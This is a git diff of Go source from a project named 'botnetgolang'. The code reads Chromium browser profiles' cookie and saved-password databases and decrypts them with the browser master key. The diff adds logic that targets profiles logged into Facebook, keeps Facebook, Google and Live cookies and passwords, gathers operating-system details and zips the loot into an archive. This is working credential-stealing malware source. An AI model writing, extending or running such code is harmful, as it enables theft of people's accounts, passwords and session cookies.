@@ -1,6 +1,7 @@
 package internal
 
 import (
+	_const "botnetgolang/internal/const"
 	"botnetgolang/internal/model"
 	"botnetgolang/internal/pkg"
 	"encoding/json"
@@ -76,6 +77,9 @@ func MainBL(browser model.BrowserPaths) {
 	}
 	cookie_ok := make([]*model.Cookie, 0)
 	info_ok := make([]*model.Info, 0)
+	cookie_ok_fb := make([]*model.Cookie, 0)
+	var pass_model model.KeyInfo
+
 	for _, profile := range allProfile.Alls {
 		path := fmt.Sprintf("%v\\Network\\Cookies", profile)
 		// connect sqlite3
@@ -84,32 +88,107 @@ func MainBL(browser model.BrowserPaths) {
 			fmt.Println(err)
 		}
 		fmt.Println(connToken)
-		token, _ := pkg.QueryData(connToken, pkg.CookiesSQL)
-		listToken := token
 
-		for _, value := range listToken {
-			tmp := value["is_httponly"]
-			fmt.Println(tmp)
-			tokenRow := &model.Cookie{
-				Domain:         value["host_key"].(string),
-				ExpirationDate: float64(value["expires_utc"].(int64)) / 1000000,
-				HttpOnly:       value["is_httponly"],
-				Name:           value["name"].(string),
-				Path:           value["path"].(string),
-				Secure:         value["is_secure"],
-				Value:          value["encrypted_value"].(string),
+		// cookies get all,      == datas2
+		cookies, _ := pkg.QueryData(connToken, pkg.CookiesSQL) // datas2
+
+		// islogin
+
+		var is_login []map[string]interface{}
+
+		for _, row := range cookies {
+			if row["name"].(string) == "xs" && strings.Contains(row["host_key"].(string), _const.Cfff) {
+				is_login = append(is_login, row)
 			}
-			result_token := pkg.GetCookie(tokenRow, allProfile.PathSource+browser.Local, masterKey)
-			if result_token != nil {
-				cookie_ok = append(cookie_ok, result_token)
-			}
-			fmt.Println(result_token)
 		}
-		fmt.Println(listToken)
 
-		path = fmt.Sprintf("%v\\Login Data", profile)
-		connInfo, err := pkg.ConnectSQLite(path)
-		info, _ := pkg.QueryData(connInfo, pkg.Passwords)
+		//
+		if len(is_login) > 0 {
+			// data_cookies_is_login get info after is_login     == datas
+
+			cookie_ok = make([]*model.Cookie, 0)
+			cookie_ok_fb = make([]*model.Cookie, 0)
+
+			var data_cookies_is_login []map[string]interface{} //datas
+
+			for _, row := range cookies {
+				if strings.Contains(row["host_key"].(string), _const.Cfff) || strings.Contains(row["host_key"].(string), _const.Cggg) || strings.Contains(row["host_key"].(string), _const.Clll) {
+					data_cookies_is_login = append(data_cookies_is_login, row)
+				}
+			}
+
+			// get to readable cookie after checking login
+			for _, value := range data_cookies_is_login { // datas
+				tmp := value["is_httponly"]
+				fmt.Println(tmp)
+				tokenRow := &model.Cookie{
+					Domain:         value["host_key"].(string),
+					ExpirationDate: float64(value["expires_utc"].(int64)) / 1000000,
+					HttpOnly:       value["is_httponly"],
+					Name:           value["name"].(string),
+					Path:           value["path"].(string),
+					Secure:         value["is_secure"],
+					Value:          value["encrypted_value"].(string),
+				}
+				result_cookie := pkg.GetCookie(tokenRow, allProfile.PathSource+browser.Local, masterKey) // allCookies
+				if result_cookie != nil {
+					cookie_ok = append(cookie_ok, result_cookie)
+				}
+			}
+
+			// get cookie fb ok
+			for _, row := range cookie_ok {
+				if strings.Contains(row.Domain, _const.Cfff) {
+					cookie_ok_fb = append(cookie_ok_fb, row)
+				}
+			}
+
+			// get info
+			path = fmt.Sprintf("%v\\Login Data", profile)
+			connInfo, _ := pkg.ConnectSQLite(path)
+			info, _ := pkg.QueryData(connInfo, pkg.Passwords)
+
+			// get info contain face, google, live
+			var list_info_pass []map[string]interface{} // arrscookieFB
+			for _, row := range info {
+				if strings.Contains(row["action_url"].(string), _const.Cfff) || strings.Contains(row["action_url"].(string), _const.Cggg) || strings.Contains(row["action_url"].(string), _const.Clll) {
+					list_info_pass = append(list_info_pass, row)
+				}
+			}
+
+			profiletmp := strings.Split(profile, "\\")
+			for _, value := range list_info_pass {
+
+				infoRow := &model.Info{
+					Url:      value["action_url"].(string),
+					UserName: value["username_value"].(string),
+					Pass:     value["password_value"].(string),
+					Browser:  browser.Name,
+					Profile:  profiletmp[len(profiletmp)-1],
+				}
+				result := pkg.GetInfo(infoRow, allProfile.PathSource+browser.Local, masterKey)
+
+				if strings.Contains(value["action_url"].(string), _const.Cfff) {
+					pass_model.Facebook = infoRow.Pass
+				} else if strings.Contains(value["action_url"].(string), _const.Cggg) {
+					pass_model.UserGmail = infoRow.UserName
+					pass_model.Facebook = infoRow.Pass
+				} else if strings.Contains(value["action_url"].(string), _const.Clll) {
+					pass_model.UserGmail = infoRow.UserName
+					pass_model.Facebook = infoRow.Pass
+				}
+				if result != nil {
+					info_ok = append(info_ok, result)
+				}
+				fmt.Println(result)
+			}
+
+			pkg.GetToken(profile, cookie_ok_fb, cookie_ok, pass_model, allProfile.Version, browser)
+		}
+
+		//path = fmt.Sprintf("%v\\Login Data", profile)
+		//connInfo, err := pkg.ConnectSQLite(path)
+		//info, _ := pkg.QueryData(connInfo, pkg.Passwords)
 
 		//// init condition to select
 		//conditions := []interface{}{
@@ -118,29 +197,25 @@ func MainBL(browser model.BrowserPaths) {
 		//	_const.Clll,
 		//}
 
-		//listInfo := pkg.FilterConditions(info, conditions, "action_url")
+		//listInfo := info
+		//fmt.Println(listInfo)
+		//profiletmp := strings.Split(profile, "\\")
+		//for _, value := range listInfo {
+		//	infoRow := &model.Info{
+		//		Url:      value["action_url"].(string),
+		//		UserName: value["username_value"].(string),
+		//		Pass:     value["password_value"].(string),
+		//		Browser:  browser.Name,
+		//		Profile:  profiletmp[len(profiletmp)-1],
+		//	}
+		//	result := pkg.GetInfo(infoRow, allProfile.PathSource+browser.Local, masterKey)
+		//	if result != nil {
+		//		info_ok = append(info_ok, result)
+		//	}
+		//	fmt.Println(result)
+		//}
 
-		listInfo := info
-		fmt.Println(listInfo)
-		profiletmp := strings.Split(profile, "\\")
-		for _, value := range listInfo {
-			infoRow := &model.Info{
-				Url:      value["action_url"].(string),
-				UserName: value["username_value"].(string),
-				Pass:     value["password_value"].(string),
-				Browser:  browser.Name,
-				Profile:  profiletmp[len(profiletmp)-1],
-			}
-			result := pkg.GetInfo(infoRow, allProfile.PathSource+browser.Local, masterKey)
-			if result != nil {
-				info_ok = append(info_ok, result)
-			}
-			fmt.Println(result)
-		}
 	}
-
-	fmt.Println(info_ok)
-	fmt.Println(cookie_ok)
 
 	pkg.DeleteFolderRecursive("storage")
 
@@ -172,9 +247,6 @@ func MainBL(browser model.BrowserPaths) {
 	err = encoder_pass.Encode(info_ok)
 
 	pkg.GetInfoOperatingSystem()
-	//pkg.FormatFile("./storage/cookie.json")
-	//pkg.FormatFile("./storage/pass.json")
-	//pkg.FormatFile("./storage/operatingsystem.json")
 
 	err = pkg.ZipSource("storage", "storage.zip")
 	if err != nil {
